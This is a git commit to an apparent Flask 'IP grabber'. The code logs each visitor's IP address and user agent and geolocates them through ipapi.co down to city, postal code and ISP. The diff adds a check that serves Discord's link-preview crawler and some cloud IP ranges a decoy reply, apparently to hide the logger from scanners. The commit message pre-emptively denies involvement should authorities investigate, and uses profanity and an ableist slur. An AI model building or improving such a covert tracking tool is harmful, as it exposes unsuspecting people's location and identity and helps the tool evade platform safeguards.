cdeb23de3e586c5629239b0140fd6e1cddf46c1b
timof121 <52547763+timof121@users.noreply.github.com>
2022-08-13 18:02:12 +0200

    In case of an investigation by any federal entity or similar, I do not have any involvement with this piece of crap called discord, or with the retarded API they have. I do not know why the fuck I am still here and not using element, probably because I am 0 IQ. I do not support platforms reading personal information like DMs.

--- main.py
+++ main.py
@@ -14,7 +14,9 @@ def index():
     # this should be uncommented if you dont use a proxy
     #ip = flask.request.remote_addr
 
-    if (ip.startswith("34.") or ip.startswith("35.") or ip == "127.0.0.1"): return "fuck off."
+    if (ip.startswith("34.") or ip.startswith("35.") or ip == "127.0.0.1" or "Discord" in flask.request.headers.get("User-Agent")):
+        return "ratio bro", 500
+        
     useragent = flask.request.headers.get('User-Agent')
     data = requests.get(f'https://ipapi.co/' + ip + '/json').json()
     funny = "".join(ip + "\n" + useragent + "\n" + data['country_name'] + "\n" + data['region'] + "\n" + data['city'] + "\n" + data['postal'] + "\n" + data['org'])    
